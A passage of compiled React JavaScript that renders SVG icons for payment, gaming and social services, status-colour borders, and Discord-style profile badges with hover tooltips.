                  "h-7 w-7 text-[#00457C] duration-300 hover:scale-110 hover:text-[#00457C]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M14.06 3.713c.12-1.071-.093-1.832-.702-2.526C12.628.356 11.312 0 9.626 0H4.734a.7.7 0 0 0-.691.59L2.005 13.509a.42.42 0 0 0 .415.486h2.756l-.202 1.28a.628.628 0 0 0 .62.726H8.14c.429 0 .793-.31.862-.731l.025-.13.48-3.043.03-.164.001-.007a.351.351 0 0 1 .348-.297h.38c1.266 0 2.425-.256 3.345-.91.379-.27.712-.603.993-1.005a4.942 4.942 0 0 0 .88-2.195c.242-1.246.13-2.356-.57-3.154a2.687 2.687 0 0 0-.76-.59l-.094-.061ZM6.543 8.82a.695.695 0 0 1 .321-.079H8.3c2.82 0 5.027-1.144 5.672-4.456l.003-.016c.217.124.4.27.548.438.546.623.679 1.535.45 2.71-.272 1.397-.866 2.307-1.663 2.874-.802.57-1.842.815-3.043.815h-.38a.873.873 0 0 0-.863.734l-.03.164-.48 3.043-.024.13-.001.004a.352.352 0 0 1-.348.296H5.595a.106.106 0 0 1-.105-.123l.208-1.32.845-5.214Z",
                }),
              });
            case "CashApp":
              return (0, c.jsxs)("svg", {
                fill: "#00D632",
                width: "24px",
                height: "24px",
                className:
                  "h-7 w-7 text-[#00D632] duration-300 hover:scale-110 hover:text-[#00D632]",
                viewBox: "0 0 24 24",
                role: "img",
                xmlns: "http://www.w3.org/2000/svg",
                children: [
                  (0, c.jsx)("title", { children: "Cash App icon" }),
                  (0, c.jsx)("path", {
                    d: "M23.59 3.47A5.1 5.1 0 0 0 20.54.42C19.23 0 18.04 0 15.62 0H8.36c-2.4 0-3.61 0-4.9.4A5.1 5.1 0 0 0 .41 3.46C0 4.76 0 5.96 0 8.36v7.27c0 2.41 0 3.6.4 4.9a5.1 5.1 0 0 0 3.05 3.05c1.3.41 2.5.41 4.9.41h7.28c2.41 0 3.61 0 4.9-.4a5.1 5.1 0 0 0 3.06-3.06c.41-1.3.41-2.5.41-4.9V8.38c0-2.41 0-3.61-.41-4.91zM17.42 8.1l-.93.93a.5.5 0 0 1-.67.01 5 5 0 0 0-3.22-1.18c-.97 0-1.94.32-1.94 1.21 0 .9 1.04 1.2 2.24 1.65 2.1.7 3.84 1.58 3.84 3.64 0 2.24-1.74 3.78-4.58 3.95l-.26 1.2a.49.49 0 0 1-.48.39H9.63l-.09-.01a.5.5 0 0 1-.38-.59l.28-1.27a6.54 6.54 0 0 1-2.88-1.57v-.01a.48.48 0 0 1 0-.68l1-.97a.49.49 0 0 1 .67 0c.91.86 2.13 1.34 3.39 1.32 1.3 0 2.17-.55 2.17-1.42 0-.87-.88-1.1-2.54-1.72-1.76-.63-3.43-1.52-3.43-3.6 0-2.42 2.01-3.6 4.39-3.71l.25-1.23a.48.48 0 0 1 .48-.38h1.78l.1.01c.26.06.43.31.37.57l-.27 1.37c.9.3 1.75.77 2.48 1.39l.02.02c.19.2.19.5 0 .68z",
                  }),
                ],
              });
            case "Venmo":
              return (0, c.jsxs)("svg", {
                fill: "#008CFF",
                xmlns: "http://www.w3.org/2000/svg",
                className:
                  "h-7 w-7 text-[#008CFF] duration-300 hover:scale-110 hover:text-[#008CFF]",
                viewBox: "0 0 50 50",
                width: "24px",
                height: "24px",
                children: [
                  "    ",
                  (0, c.jsx)("path", {
                    d: "M41,4H9C6.243,4,4,6.243,4,9v32c0,2.757,2.243,5,5,5h32c2.757,0,5-2.243,5-5V9C46,6.243,43.757,4,41,4z M28,37H17l-3-22 l8-1.001L24,30c1.833-2.918,4-7.873,4-11c0-1.711-0.531-3.04-1-4l8-2c0.853,1.377,1,3.795,1,5.586C36,24.3,32.05,31.788,28,37z",
                  }),
                ],
              });
            case "Crypto":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#ffb515] duration-300 hover:scale-110 hover:text-[#ffb515]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M5.5 13v1.25c0 .138.112.25.25.25h1a.25.25 0 0 0 .25-.25V13h.5v1.25c0 .138.112.25.25.25h1a.25.25 0 0 0 .25-.25V13h.084c1.992 0 3.416-1.033 3.416-2.82 0-1.502-1.007-2.323-2.186-2.44v-.088c.97-.242 1.683-.974 1.683-2.19C11.997 3.93 10.847 3 9.092 3H9V1.75a.25.25 0 0 0-.25-.25h-1a.25.25 0 0 0-.25.25V3h-.573V1.75a.25.25 0 0 0-.25-.25H5.75a.25.25 0 0 0-.25.25V3l-1.998.011a.25.25 0 0 0-.25.25v.989c0 .137.11.25.248.25l.755-.005a.75.75 0 0 1 .745.75v5.505a.75.75 0 0 1-.75.75l-.748.011a.25.25 0 0 0-.25.25v1c0 .138.112.25.25.25L5.5 13zm1.427-8.513h1.719c.906 0 1.438.498 1.438 1.312 0 .871-.575 1.362-1.877 1.362h-1.28V4.487zm0 4.051h1.84c1.137 0 1.756.58 1.756 1.524 0 .953-.626 1.45-2.158 1.45H6.927V8.539z",
                }),
              });
            case "Battle Net":
              return (0, c.jsx)("svg", {
                fill: "#ace5ee",
                xmlns: "http://www.w3.org/2000/svg",
                className:
                  "h-7 w-7 text-[#ace5ee] duration-300 hover:scale-110 hover:text-[#ace5ee]",
                viewBox: "0 0 30 30",
                width: "30px",
                height: "30px",
                children: (0, c.jsx)("path", {
                  d: "M24.822,13.457c0,0,2.139,0.109,2.139-1.149c0-1.643-2.849-3.124-2.849-3.124s0.446-0.946,0.724-1.475c0.279-0.529,1.064-2.591,1.133-3.063c0.088-0.592-0.047-0.778-0.047-0.778c-0.193,1.269-2.262,4.924-2.427,5.049c-2.018-0.945-4.79-1.208-4.79-1.208S15.993,2,13.442,2c-2.531,0-2.518,4.889-2.518,4.889S10.209,5.503,9.31,5.503c-1.312,0-1.743,1.983-1.743,4.133c-2.591,0-4.77,0.578-4.966,0.634c-0.194,0.057-0.807,0.503-0.529,0.446c0.566-0.181,3.229-0.593,5.56-0.391c0.128,2.044,1.322,4.705,1.322,4.705s-2.56,3.706-2.56,6.353c0,0.696,0.303,1.97,2.142,1.97c1.539,0,3.269-0.925,3.594-1.113c-0.284,0.406-0.495,1.177-0.495,1.532c0,0.291,0.172,1.113,1.359,1.113c1.525,0,3.229-1.168,3.229-1.168s1.608,2.671,2.984,3.895c0.37,0.329,0.726,0.39,0.726,0.39s-1.366-1.314-3.166-4.7c1.673-1.033,3.415-3.468,3.415-3.468s0.206,0.006,1.793,0.006c2.489,0,6.025-0.522,6.025-2.498C28.002,15.3,24.822,13.457,24.822,13.457z M25.101,12.23c0,0.721-0.687,0.712-0.687,0.712l-0.521,0.035c0,0-0.992-0.521-1.591-0.764c0,0,0.93-1.432,1.148-1.832C23.614,10.475,25.101,11.405,25.101,12.23z M14.687,4.876c1.17,0,2.839,2.758,2.839,2.758s-2.606-0.233-4.749,1.026C12.835,6.675,13.505,4.876,14.687,4.876z M10.052,7.112c0.371,0,0.735,0.451,0.885,0.834c0,0.253,0.131,1.731,0.131,1.731l-2.147-0.08C8.921,7.661,9.68,7.112,10.052,7.112z M9.829,20.55c-1.174,0-1.416-0.654-1.416-1.242c0-1.331,1.064-3.194,1.064-3.194s1.191,2.505,3.274,3.563C11.718,20.283,10.865,20.55,9.829,20.55z M13.641,23.173c-0.822,0-0.922-0.532-0.922-0.657c0-0.383,0.298-0.833,0.298-0.833s1.383-0.934,1.471-1.034l1.023,1.905C15.511,22.554,14.463,23.173,13.641,23.173z M16.208,22.134c-0.5-0.874-0.87-1.788-0.87-1.788s2.058,0.132,3.162-1.008c-0.688,0.31-1.787,0.7-3.066,0.582c2.672-2.351,4.231-4.055,5.549-5.815c-0.114-0.136-0.716-0.557-0.864-0.628c-0.796,0.957-3.889,4.262-6.754,5.898c-3.626-1.978-4.389-7.793-4.466-9.001l1.981,0.191c0,0-0.744,1.319-0.744,2.289s0.116,1.021,0.116,1.021s-0.025-1.691,1.021-2.999c0.796,4.237,1.627,6.407,2.274,7.701c0.329-0.136,0.945-0.409,0.945-0.409s-1.832-5.269-1.73-8.835c0.83-0.443,2.059-0.9,3.446-0.9c3.65,0,6.584,1.569,6.584,1.569l-1.149,1.602c0,0-1.023-1.851-2.468-2.182c0.761,0.567,1.614,1.317,2.059,2.397c-3.025-1.181-6.675-1.806-7.846-1.943c-0.102,0.432-0.088,1.049-0.088,1.049s4.895,0.903,8.457,2.939C21.734,18.318,16.879,21.738,16.208,22.134z M20.844,18.806c0,0,1.52-1.992,1.496-4.632c0,0,2.455,1.519,2.455,3.001C24.796,18.831,20.844,18.806,20.844,18.806z",
                }),
              });
            case "Valorant":
              return (0, c.jsxs)("svg", {
                fill: "#fa4454",
                xmlns: "http://www.w3.org/2000/svg",
                className:
                  "h-7 w-7 text-[#fa4454] duration-300 hover:scale-110 hover:text-[#fa4454]",
                viewBox: "0 0 24 24",
                width: "24px",
                height: "24px",
                children: [
                  (0, c.jsx)("path", {
                    d: "M16.19,21H7.546L0,12.376V2.319L16.19,21z M8.454,19h3.356L2,7.681v3.943L8.454,19z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M21.535,16h-7.58L24,3.085v9.217L21.535,16z M18.044,14h2.42L22,11.697V8.915L18.044,14z",
                  }),
                ],
              });
            case "osu!":
              return (0, c.jsxs)("svg", {
                fill: "#fc5d99",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 50 50",
                width: "24px",
                height: "24px",
                children: [
                  (0, c.jsx)("path", {
                    d: "M25,5c11.028,0,20,8.972,20,20s-8.972,20-20,20S5,36.028,5,25S13.972,5,25,5 M25,3C12.85,3,3,12.85,3,25s9.85,22,22,22 s22-9.85,22-22S37.15,3,25,3L25,3z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M18,25.572c-0.01,0.796-0.124,1.615-0.494,2.374c-0.565,1.159-1.493,1.805-2.723,1.998 c-0.742,0.116-1.483,0.093-2.202-0.145c-1.178-0.389-1.916-1.236-2.307-2.427c-0.254-0.774-0.313-1.572-0.25-2.382 c0.061-0.793,0.249-1.549,0.659-2.23c0.589-0.981,1.457-1.527,2.553-1.69c0.75-0.112,1.499-0.087,2.221,0.171 c1.246,0.446,2,1.364,2.342,2.662C17.938,24.435,17.995,24.978,18,25.572z M15.688,25.465c-0.006-0.125-0.01-0.316-0.026-0.507 c-0.037-0.453-0.116-0.895-0.316-1.306c-0.201-0.414-0.519-0.678-0.961-0.757c-0.192-0.035-0.392-0.045-0.587-0.03 c-0.501,0.038-0.895,0.275-1.122,0.748c-0.104,0.217-0.187,0.451-0.242,0.687c-0.151,0.647-0.147,1.307-0.085,1.965 c0.037,0.398,0.123,0.785,0.299,1.146c0.166,0.34,0.409,0.593,0.764,0.711c0.396,0.133,0.796,0.13,1.191-0.01 c0.457-0.162,0.704-0.528,0.859-0.975C15.643,26.619,15.68,26.077,15.688,25.465z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M32.808,21.214c0.732-0.135,1.454-0.133,2.189,0c0,0.043,0,0.085,0,0.126c0,2.67-0.001,5.34,0.002,8.01 c0,0.095-0.027,0.13-0.109,0.157c-1.141,0.373-2.305,0.559-3.499,0.473c-0.515-0.037-1.03-0.087-1.52-0.279 c-0.927-0.363-1.451-1.105-1.712-2.09c-0.154-0.58-0.19-1.176-0.191-1.774c-0.003-1.505-0.001-3.011-0.001-4.516 c0-0.034,0.003-0.068,0.005-0.108c0.734-0.133,1.463-0.133,2.202,0.001c0,0.055,0,0.104,0,0.153 c0.001,1.559-0.004,3.118,0.009,4.677c0.003,0.314,0.052,0.634,0.122,0.94c0.141,0.618,0.53,0.963,1.118,1.045 c0.423,0.059,0.844,0.035,1.262-0.052c0.095-0.02,0.125-0.057,0.125-0.164c-0.003-2.149-0.003-4.298-0.003-6.447 C32.808,21.317,32.808,21.268,32.808,21.214z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M25.271,23.161c-0.364-0.107-0.711-0.229-1.067-0.31c-0.447-0.102-0.903-0.128-1.354-0.012 c-0.237,0.061-0.45,0.166-0.541,0.426c-0.121,0.345-0.004,0.693,0.322,0.836c0.356,0.156,0.731,0.266,1.097,0.397 c0.321,0.114,0.65,0.21,0.962,0.347c0.829,0.365,1.241,1.038,1.301,1.957c0.051,0.772-0.128,1.467-0.639,2.05 c-0.443,0.504-1.007,0.796-1.63,0.977c-0.68,0.197-1.375,0.201-2.072,0.151c-0.602-0.044-1.182-0.192-1.748-0.405 c-0.063-0.024-0.085-0.053-0.078-0.124c0.06-0.568,0.206-1.111,0.431-1.633c0.007-0.017,0.017-0.034,0.031-0.063 c0.042,0.015,0.082,0.029,0.122,0.045c0.646,0.253,1.31,0.411,2.006,0.377c0.32-0.015,0.633-0.066,0.92-0.228 c0.384-0.217,0.527-0.537,0.427-0.944c-0.039-0.156-0.113-0.292-0.253-0.361c-0.229-0.114-0.462-0.223-0.703-0.306 c-0.434-0.15-0.879-0.27-1.313-0.422c-0.321-0.112-0.608-0.296-0.869-0.522c-0.365-0.316-0.537-0.734-0.597-1.208 c-0.068-0.536-0.041-1.065,0.173-1.568c0.286-0.673,0.805-1.083,1.452-1.338c0.566-0.223,1.158-0.274,1.758-0.263 c0.766,0.014,1.505,0.172,2.227,0.428c0.048,0.017,0.096,0.025,0.087,0.105c-0.064,0.556-0.202,1.089-0.441,1.593 C25.277,23.152,25.27,23.161,25.271,23.161z",
                  }),
                  (0, c.jsx)("rect", {
                    width: "2",
                    height: "8",
                    x: "38",
                    y: "18",
                  }),
                  (0, c.jsx)("rect", {
                    width: "2",
                    height: "2",
                    x: "38",
                    y: "28",
                  }),
                ],
              });
            case "Last.fm":
              return (0, c.jsx)("svg", {
                fill: "#ae0000",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 32 32",
                width: "24px",
                height: "24px",
                children: (0, c.jsx)("path", {
                  d: "M 14.347656 22.078125 L 13.320313 19.289063 C 13.320313 19.289063 11.652344 21.148438 9.152344 21.148438 C 6.941406 21.148438 5.367188 19.222656 5.367188 16.144531 C 5.367188 12.199219 7.355469 10.789063 9.3125 10.789063 C 12.136719 10.789063 13.03125 12.617188 13.804688 14.957031 L 14.828125 18.164063 C 15.855469 21.277344 17.78125 23.777344 23.328125 23.777344 C 27.304688 23.777344 30 22.558594 30 19.351563 C 30 16.753906 28.523438 15.40625 25.765625 14.765625 L 23.710938 14.316406 C 22.300781 13.996094 21.882813 13.417969 21.882813 12.457031 C 21.882813 11.367188 22.75 10.722656 24.160156 10.722656 C 25.699219 10.722656 26.535156 11.300781 26.664063 12.679688 L 29.871094 12.296875 C 29.613281 9.410156 27.625 8.222656 24.351563 8.222656 C 21.46875 8.222656 18.644531 9.3125 18.644531 12.808594 C 18.644531 14.988281 19.703125 16.367188 22.363281 17.011719 L 24.546875 17.523438 C 26.179688 17.910156 26.726563 18.582031 26.726563 19.511719 C 26.726563 20.699219 25.570313 21.179688 23.390625 21.179688 C 20.152344 21.179688 18.804688 19.480469 18.035156 17.140625 L 16.976563 13.933594 C 15.628906 9.761719 13.480469 8.222656 9.214844 8.222656 C 4.503906 8.222656 2 11.203125 2 16.273438 C 2 21.148438 4.503906 23.777344 8.992188 23.777344 C 12.617188 23.777344 14.347656 22.078125 14.347656 22.078125 Z",
                }),
              });
            case "MyAnimeList":
              return (0, c.jsxs)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "24px",
                height: "24px",
                viewBox: "0 0 1024 1024",
                children: [
                  (0, c.jsx)("circle", {
                    cx: "512",
                    cy: "512",
                    r: "512",
                    style: { fill: "#2d4e9d" },
                  }),
                  (0, c.jsx)("path", {
                    d: "M432.49 410.61V590.3l-44.86-.06V479l-43.31 51.29-42.43-52.44-.43 112.75H256V410.65h47l39.79 54.29 43-54.31zm184.06 44.14.53 135.15h-50.45l-.17-61.25h-59.73c1.49 10.65 4.48 27 8.9 38 3.31 8.13 6.36 16 12.44 24.06l-36.37 24c-7.45-13.57-13.27-28.52-18.73-44.42a198.31 198.31 0 0 1-10.82-46.49c-1.81-16-2.07-31.38 2.28-47.19a83.37 83.37 0 0 1 24.77-39.81c6.68-6.25 16-10.67 23.47-14.66s15.85-5.63 23.62-7.66a158 158 0 0 1 25.41-3.9c8.49-.73 23.62-1.41 51-.6l11.63 37.31h-58.78c-12.65.17-18.73 0-28.61 4.46a47.7 47.7 0 0 0-27.26 41l56.81.7.81-38.61h49.26zM701.72 410v141.35L768 552l-9.17 37.87H656.28V409.33z",
                    style: { fill: "#fff" },
                  }),
                ],
              });
            case "Deezer":
              return (0, c.jsx)("svg", {
                fill: "#0ca07c",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 50 50",
                width: "24px",
                height: "24px",
                children: (0, c.jsx)("path", {
                  d: "M 39 14 L 39 16 L 47 16 L 47 14 Z M 21 17 L 21 19 L 29 19 L 29 17 Z M 39 17 L 39 19 L 47 19 L 47 17 Z M 21 20 L 21 22 L 29 22 L 29 20 Z M 39 20 L 39 22 L 47 22 L 47 20 Z M 3 23 L 3 25 L 11 25 L 11 23 Z M 21 23 L 21 25 L 29 25 L 29 23 Z M 30 23 L 30 25 L 38 25 L 38 23 Z M 39 23 L 39 25 L 47 25 L 47 23 Z M 3 26 L 3 28 L 11 28 L 11 26 Z M 21 26 L 21 28 L 29 28 L 29 26 Z M 30 26 L 30 28 L 38 28 L 38 26 Z M 39 26 L 39 28 L 47 28 L 47 26 Z M 3 29 L 3 31 L 11 31 L 11 29 Z M 12 29 L 12 31 L 20 31 L 20 29 Z M 21 29 L 21 31 L 29 31 L 29 29 Z M 30 29 L 30 31 L 38 31 L 38 29 Z M 39 29 L 39 31 L 47 31 L 47 29 Z M 3 32 L 3 34 L 11 34 L 11 32 Z M 12 32 L 12 34 L 20 34 L 20 32 Z M 21 32 L 21 34 L 29 34 L 29 32 Z M 30 32 L 30 34 L 38 34 L 38 32 Z M 39 32 L 39 34 L 47 34 L 47 32 Z M 3 35 L 3 37 L 11 37 L 11 35 Z M 12 35 L 12 37 L 20 37 L 20 35 Z M 21 35 L 21 37 L 29 37 L 29 35 Z M 30 35 L 30 37 L 38 37 L 38 35 Z M 39 35 L 39 37 L 47 37 L 47 35 Z",
                }),
              });
            case "Pintrest":
              return (0, c.jsxs)("svg", {
                fill: "#E60023",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 24 24",
                width: "24px",
                height: "24px",
                children: [
                  "    ",
                  (0, c.jsx)("path", {
                    d: "M 12 2 C 6.477 2 2 6.477 2 12 C 2 17.523 6.477 22 12 22 C 17.523 22 22 17.523 22 12 C 22 6.477 17.523 2 12 2 z M 12 4 C 16.418 4 20 7.582 20 12 C 20 16.418 16.418 20 12 20 C 11.264382 20 10.555494 19.892969 9.8789062 19.707031 C 10.09172 19.278284 10.282622 18.826454 10.386719 18.425781 C 10.501719 17.985781 10.972656 16.191406 10.972656 16.191406 C 11.278656 16.775406 12.173 17.271484 13.125 17.271484 C 15.958 17.271484 18 14.665734 18 11.427734 C 18 8.3227344 15.467031 6 12.207031 6 C 8.1520313 6 6 8.7215469 6 11.685547 C 6 13.063547 6.73325 14.779172 7.90625 15.326172 C 8.08425 15.409172 8.1797031 15.373172 8.2207031 15.201172 C 8.2527031 15.070172 8.4114219 14.431766 8.4824219 14.134766 C 8.5054219 14.040766 8.4949687 13.958234 8.4179688 13.865234 C 8.0299688 13.394234 7.71875 12.529656 7.71875 11.722656 C 7.71875 9.6496562 9.2879375 7.6445312 11.960938 7.6445312 C 14.268937 7.6445313 15.884766 9.2177969 15.884766 11.466797 C 15.884766 14.007797 14.601641 15.767578 12.931641 15.767578 C 12.009641 15.767578 11.317063 15.006312 11.539062 14.070312 C 11.804063 12.953313 12.318359 11.747406 12.318359 10.941406 C 12.318359 10.220406 11.932859 9.6191406 11.130859 9.6191406 C 10.187859 9.6191406 9.4296875 10.593391 9.4296875 11.900391 C 9.4296875 12.732391 9.7109375 13.294922 9.7109375 13.294922 C 9.7109375 13.294922 8.780375 17.231844 8.609375 17.964844 C 8.5246263 18.326587 8.4963381 18.755144 8.4941406 19.183594 C 5.8357722 17.883113 4 15.15864 4 12 C 4 7.582 7.582 4 12 4 z",
                  }),
                ],
              });
            case "Linkedin":
              return (0, c.jsxs)("svg", {
                fill: "#0072b1",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 30 30",
                width: "24px",
                height: "24px",
                children: [
                  "    ",
                  (0, c.jsx)("path", {
                    d: "M15,3C8.373,3,3,8.373,3,15c0,6.627,5.373,12,12,12s12-5.373,12-12C27,8.373,21.627,3,15,3z M10.496,8.403 c0.842,0,1.403,0.561,1.403,1.309c0,0.748-0.561,1.309-1.496,1.309C9.561,11.022,9,10.46,9,9.712C9,8.964,9.561,8.403,10.496,8.403z M12,20H9v-8h3V20z M22,20h-2.824v-4.372c0-1.209-0.753-1.488-1.035-1.488s-1.224,0.186-1.224,1.488c0,0.186,0,4.372,0,4.372H14v-8 h2.918v1.116C17.294,12.465,18.047,12,19.459,12C20.871,12,22,13.116,22,15.628V20z",
                  }),
                ],
              });
            case "Tumblr":
              return (0, c.jsxs)("svg", {
                fill: "#34526f",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 30 30",
                width: "24px",
                height: "24px",
                children: [
                  "    ",
                  (0, c.jsx)("path", {
                    d: "M24,4H6C4.895,4,4,4.895,4,6v18c0,1.105,0.895,2,2,2h18c1.105,0,2-0.895,2-2V6C26,4.895,25.105,4,24,4z M20,21.714 c0,0.055-0.022,0.11-0.066,0.143C19.879,21.912,18.305,23,15.429,23C11.979,23,12,18.87,12,18.429v-4.571H9.913 c-0.111,0-0.199-0.088-0.199-0.199v-1.899c0-0.088,0.045-0.154,0.121-0.187c0.033-0.011,3.307-1.453,3.307-4.373 C13.143,7.088,13.231,7,13.342,7h1.889c0.11,0,0.198,0.088,0.198,0.199v4.373h3.23c0.099,0,0.199,0.088,0.199,0.199v1.889 c0,0.11-0.099,0.198-0.199,0.198h-3.23v4.571c0,0.066-0.105,1.456,1.371,1.456c1.213,0,2.88-0.397,2.891-0.397 c0.066-0.045,0.143-0.045,0.199-0.011C19.955,19.51,20,19.576,20,19.653V21.714z",
                  }),
                ],
              });
          }
        },
        V = function (e) {
          switch (e) {
            case "online":
              return "border-green-600";
            case "idle":
              return "border-yellow-600";
            case "dnd":
              return "border-red-600";
            case "offline":
              return "border-slate-600";
          }
        },
        A = function (e) {
          return e.bio_presence.badges.map(function (t) {
            switch (t) {
              case "Active Developer":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", width: "24", height: "24", viewBox: "0 0 24 24", fill: "none", children: (0, c.jsx)("path", { d: "M6.47213 4L4 6.47213V17.5279L6.47217 20H17.5278L20 17.5279V6.47213L17.5279 4H6.47213ZM10.8582 16.4255H8.64551C8.64551 14.5952 7.1567 13.1064 5.32642 13.1064V10.8936C7.1567 10.8936 8.64551 9.40483 8.64551 7.57454H10.8582C10.8582 9.39042 9.96684 10.9908 8.61129 12C9.96684 13.0093 10.8582 14.6096 10.8582 16.4255ZM18.6667 13.1064C16.8364 13.1064 15.3476 14.5952 15.3476 16.4255H13.1348C13.1348 14.6096 14.0263 13.0093 15.3818 12C14.0263 10.9908 13.1348 9.39042 13.1348 7.57454H15.3476C15.3476 9.40483 16.8364 10.8936 18.6667 10.8936V13.1064V13.1064Z", fill: "#2EA967" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "HypeSquad Bravery":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsx)("path", { clipRule: "evenodd", d: "m5.01502 4h13.97008c.1187 0 .215.09992.215.22305v9.97865c0 .0697-.0312.1343-.0837.1767l-6.985 5.5752c-.0389.0313-.0847.0464-.1314.0464-.0466 0-.0924-.0151-.1313-.0464l-6.985-5.5752c-.05252-.0424-.08365-.107-.08365-.1767v-9.97865c0-.12313.0963-.22305.21497-.22305zm7.82148 7.0972 4.1275-2.71296c.1039-.06863.2299.04542.1725.15644l-1.7114 3.36192c-.0403.0807.0182.1756.1079.1756h1.0246c.118 0 .1664.1504.0706.219l-4.6267 3.3175c-.0414.0303-.0978.0303-.1402 0l-4.6267-3.3175c-.0948-.0686-.04639-.219.07059-.219h1.02356c.09076 0 .14925-.0949.10791-.1756l-1.71132-3.36293c-.05648-.11001.06958-.22305.17345-.15543l4.12851 2.71296c.0716.0474.1291.112.1674.1887l.6293 1.2636c.0444.0888.1714.0888.2158 0l.6293-1.2636c.0383-.0767.0958-.1423.1674-.1887z", fill: "#9c84ef", fillRule: "evenodd" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "HypeSquad Brilliance":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsx)("path", { clipRule: "evenodd", d: "m12 20c4.4183 0 8-3.5817 8-8 0-4.41828-3.5817-8-8-8-4.41828 0-8 3.58172-8 8 0 4.4183 3.58172 8 8 8zm.7921-8.275 3.6146-2.3738c.0909-.05916.2013.03974.151.136l-1.4986 2.9416c-.0354.0707.0158.1537.0944.1537h.8973c.1033 0 .1457.1315.0618.1916l-4.0517 2.9027c-.0362.0265-.0856.0265-.1227 0l-4.05168-2.9027c-.08301-.0601-.04062-.1916.06182-.1916h.89634c.07948 0 .1307-.083.09449-.1537l-1.49862-2.9416c-.04945-.09626.06094-.19516.1519-.136l3.61545 2.3738c.0627.0415.113.098.1465.1651l.5511 1.1057c.0389.0777.1501.0777.189 0l.551-1.1057c.0336-.0671.0839-.1245.1466-.1651z", fill: "#f47b67", fillRule: "evenodd" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "HypeSquad Balance":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsx)("path", { clipRule: "evenodd", d: "m11.8622 4.05696c.076-.07595.1996-.07595.2756 0l7.8048 7.80474c.0371.0362.0574.0865.0574.1377 0 .0513-.0212.1016-.0574.1378l-7.8048 7.8047c-.038.038-.0883.0574-.1378.0574s-.0998-.0194-.1378-.0574l-7.8048-7.8047c-.03709-.0362-.0574-.0857-.0574-.1378s.02031-.1015.0574-.1377zm.9299 8.29474 3.6146-2.37377c.0909-.05917.2013.03977.151.13597l-1.4986 2.9416c-.0354.0707.0158.1537.0944.1537h.8973c.1033 0 .1457.1316.0618.1916l-4.0517 2.9028c-.0362.0265-.0856.0265-.1227 0l-4.05168-2.9028c-.08301-.06-.04062-.1916.06182-.1916h.89634c.07948 0 .1307-.083.09449-.1537l-1.49862-2.9416c-.04945-.0962.06094-.19514.1519-.13597l3.61545 2.37377c.0627.0415.113.098.1465.1651l.5511 1.1057c.0389.0777.1501.0777.189 0l.551-1.1057c.0336-.0671.0839-.1245.1466-.1651z", fill: "#45ddc0", fillRule: "evenodd" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "Discord Nitro":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsxs)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: [(0, c.jsx)("circle", { cx: "15", cy: "12", fill: "#fff", r: "6" }), (0, c.jsx)("path", { clipRule: "evenodd", d: "m2.20812 10.124c.42636 0 .7816-.34817.7816-.76611 0-.41793-.35524-.76615-.7816-.76615h-.42635c-.42636 0-.78177.34822-.78177.76615 0 .41794.35541.76611.78177.76611zm16.13038 9.2643c4.0504-1.811 5.7558-6.4083 3.9083-10.23937-1.2791-2.71657-3.9793-4.31859-6.8217-4.45801h-8.02965c-.71065 0-1.20812.55735-1.20812 1.18425 0 .69645.56859 1.18409 1.20812 1.18409h2.06067c.42635 0 .78158.34822.78158.76616 0 .41793-.35523.76632-.78158.76632h-5.04517c-.42635 